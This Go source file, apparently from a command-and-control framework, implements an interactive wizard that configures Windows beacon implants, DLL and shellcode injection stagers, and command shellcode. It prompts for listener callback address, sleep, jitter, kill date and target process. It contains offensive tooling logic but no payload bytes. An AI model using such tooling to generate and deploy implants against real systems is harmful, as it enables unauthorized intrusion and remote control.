package wizard

import (
	"fmt"
	"net/url"
	"strconv"
	"strings"

	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/stdin"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/payload"
)

func WizardPayloadType() string {
	items := []string{
		"implant/beacon",
		// "implant/interactive",
		"stager/dll-loader",
		"stager/exec-loader",
		"stager/shellcode-loader",
		"shellcode/cmd",
		// "shellcode/implant/beacon",
		// "shellcode/stager/dll-loader",
		// "shellcode/stager/exec-loader",
		// "shellcode/stager/shellcode-loader",
	}
	for {
		res, err := stdin.Select("What to generate?", items)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			continue
		}
		return strings.ToLower(res)
	}
}

func wizardPayloadBase(
	host string,
	listeners []*listener.Listener,
	isShellcode bool,
) (
	oOs string,
	oArch string,
	oFormat string,
	oLprotocol string,
	oLhost string,
	oLport uint16,
	err error,
) {
	var items []string

	if isShellcode {
		items = []string{
			// "linux/x64/bin",
			// "linux/x86/bin",
			"windows/x64/bin",
			"windows/x86/bin",
		}
	} else {
		items = []string{
			// "linux/amd64/elf",
			// "linux/i686/elf",
			"windows/amd64/dll",
			"windows/amd64/exe",
			"windows/i686/dll",
			"windows/i686/exe",
		}
	}
	for {
		res, err := stdin.Select("OS/Arch/Format", items)
		if err != nil {
			stdout.LogFailed("Invalid input.")
			continue
		}
		selected := strings.Split(res, "/")
		oOs = selected[0]
		oArch = selected[1]
		oFormat = selected[2]
		break
	}

	customUrl := true
	oLhost = host

	// Check if listeners exist.
	if len(listeners) > 0 {
		for {
			items := []string{}
			for _, lis := range listeners {
				// lisUrl := fmt.Sprintf("%s://%s:%d", strings.ToLower(lis.Protocol), lis.Addr, lis.Port)
				item := fmt.Sprintf(
					"%s | %s://%s:%d | %s",
					lis.Name,
					lis.Protocol,
					lis.Addr,
					lis.Port,
					strings.Join(lis.Domains, ","),
				)
				items = append(items, item)
			}
			items = append(items, "Custom URL")

			res, err := stdin.Select("Listener", items)
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}

			if res == "Custom URL" {
				customUrl = true
			} else {
				customUrl = false
				lisSplit := strings.Split(res, " | ")
				// lisName := lisSplit[0]
				lisUrl := lisSplit[1]
				// lisDomains := lisSplit[2]
				parsedUrl, err := url.ParseRequestURI(lisUrl)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				oLprotocol = parsedUrl.Scheme
				oLhost = parsedUrl.Hostname()
				oLport64, err := strconv.ParseUint(parsedUrl.Port(), 10, 64)
				if err != nil {
					stdout.LogFailed(fmt.Sprint(err))
					continue
				}
				oLport = uint16(oLport64)
			}
			break
		}
	}

	if customUrl {
		for {
			items := []string{"HTTPS"}
			res, err := stdin.Select("Listener Protocol", items)
			if err != nil {
				stdout.LogFailed("Invalid input.")
				continue
			}
			if res == "" {
				continue
			}
			oLprotocol = res
			break
		}

		for {
			res, err := stdin.ReadInput("Listener Host", host)
			if err != nil {
				stdout.LogFailed("Invalid input.")
				continue
			}
			if res == "" {
				continue
			}
			oLhost = res
			break
		}

		for {
			res, err := stdin.ReadInput("Listener Port", "")
			if err != nil {
				stdout.LogFailed("Invlaid input.")
				continue
			}
			if res == "" {
				continue
			}

			resU64, err := strconv.ParseUint(res, 10, 64)
			if err != nil {
				stdout.LogFailed("Invalid port number.")
				continue
			}
			oLport = uint16(resU64)
			break
		}
	}

	return oOs, oArch, oFormat, oLprotocol, oLhost, oLport, nil
}

func WizardPayloadImplantGenerate(
	host string,
	listeners []*listener.Listener,
	payloadType string,
) (*payload.Implant, error) {
	oOs, oArch, oFormat, oLprotocol, oLhost, oLport, err := wizardPayloadBase(host, listeners, false)
	if err != nil {
		return nil, err
	}

	oType := strings.Replace(payloadType, "implant/", "", -1)

	var oSleep uint = 3
	if oType == "beacon" {
		for {
			res, err := stdin.ReadInput("Sleep", fmt.Sprint(oSleep))
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}

			oSleep64, err := strconv.ParseUint(res, 10, 64)
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}
			oSleep = uint(oSleep64)
			break
		}
	}

	var oJitter uint = 10
	if oType == "beacon" {
		for {
			res, err := stdin.ReadInput("Jitter", fmt.Sprint(oJitter))
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}

			oJitter64, err := strconv.ParseUint(res, 10, 64)
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}
			oJitter = uint(oJitter64)
			break
		}
	}

	var oKillDateStr string = meta.GetFutureDateTime(1, 0, 0)
	var oKillDate uint
	for {
		res, err := stdin.ReadInput("KillDate", oKillDateStr)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			continue
		}
		oKillDateInt, err := meta.ParseDateTimeInt(res)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			continue
		}
		oKillDateStr = res
		oKillDate = uint(oKillDateInt)
		break
	}

	table := []stdout.SingleTableItem{
		stdout.NewSingleTableItem("Type", oType),
		stdout.NewSingleTableItem("Target OS", oOs),
		stdout.NewSingleTableItem("Target Arch", oArch),
		stdout.NewSingleTableItem("Format", oFormat),
		stdout.NewSingleTableItem("Listener", fmt.Sprintf("%s://%s:%d", strings.ToLower(oLprotocol), oLhost, oLport)),
		stdout.NewSingleTableItem("Sleep", fmt.Sprint(oSleep)),
		stdout.NewSingleTableItem("Jitter", fmt.Sprint(oJitter)),
		stdout.NewSingleTableItem("KillDate", oKillDateStr),
	}
	stdout.PrintSingleTable("Implant Options", table)

	var proceed bool
	for {
		res, err := stdin.Confirm("Proceed?")
		if err != nil {
			continue
		}
		proceed = res
		break
	}
	if !proceed {
		return nil, fmt.Errorf("canceled")
	}

	return payload.NewImplant(
		0, "", "",
		oOs,
		oArch,
		oFormat,
		oLprotocol,
		oLhost,
		oLport,
		oType,
		oSleep,
		oJitter,
		oKillDate,
	), nil
}

func WizardPayloadStagerGenerate(
	host string,
	listeners []*listener.Listener,
	payloadType string,
) (*payload.Stager, error) {
	oOs, oArch, oFormat, oLprotocol, oLhost, oLport, err := wizardPayloadBase(host, listeners, false)
	if err != nil {
		return nil, err
	}

	oType := strings.Replace(payloadType, "stager/", "", -1)

	// Technique
	var oTechnique string
	var items []string
	if oType == "dll-loader" {
		items = []string{
			"dll-injection",
			// "reflective-dll-injection",
			// "indirect-syscalls",
		}
	} else if oType == "exec-loader" {
		items = []string{
			"direct-execution",
			// "process-doppeleganging",
		}
	} else if oType == "shellcode-loader" {
		items = []string{
			"shellcode-injection",
			// "dll-hollowing",
			// "process-mockingjay",
		}
	}
	for {
		res, err := stdin.Select("Technique", items)
		if err != nil {
			continue
		}
		oTechnique = res
		break
	}

	// Process name to inject
	var oProcess string
	for {
		res, err := stdin.ReadInput("Process to Inject", "notepad.exe")
		if err != nil {
			continue
		}
		oProcess = res
		break
	}

	table := []stdout.SingleTableItem{
		stdout.NewSingleTableItem("Target OS", oOs),
		stdout.NewSingleTableItem("Target Arch", oArch),
		stdout.NewSingleTableItem("Format", oFormat),
		stdout.NewSingleTableItem("Listener", fmt.Sprintf("%s://%s:%d", strings.ToLower(oLprotocol), oLhost, oLport)),
		stdout.NewSingleTableItem("Type", oType),
		stdout.NewSingleTableItem("Technique", oTechnique),
		stdout.NewSingleTableItem("Process", oProcess),
	}
	stdout.PrintSingleTable("Stager Options", table)

	var proceed bool
	for {
		res, err := stdin.Confirm("Proceed?")
		if err != nil {
			continue
		}
		proceed = res
		break
	}
	if !proceed {
		return nil, fmt.Errorf("canceled")
	}

	return payload.NewStager(
		0,
		"",
		"",
		oOs,
		oArch,
		oFormat,
		oLprotocol,
		oLhost,
		oLport,
		oType,
		oTechnique,
		oProcess,
	), nil
}

func WizardPayloadShellcodeGenerate(
	host string,
	listeners []*listener.Listener,
	payloadType string,
) (*payload.Shellcode, error) {
	oOs, oArch, oFormat, oLprotocol, oLhost, oLport, err := wizardPayloadBase(host, listeners, true)
	if err != nil {
		return nil, err
	}

	oType := strings.Replace(payloadType, "shellcode/", "", -1)
	oTypeArgs := ""
	if oType == "cmd" {
		for {
			res, err := stdin.ReadInput("Command to execute", "calc.exe")
			if err != nil {
				stdout.LogFailed(fmt.Sprint(err))
				continue
			}
			oTypeArgs = res
			break
		}
	}

	return payload.NewShellcode(
		0,
		"",
		"",
		oOs,
		oArch,
		oFormat,
		oLprotocol,
		oLhost,
		oLport,
		oType,
		oTypeArgs,
	), nil
}
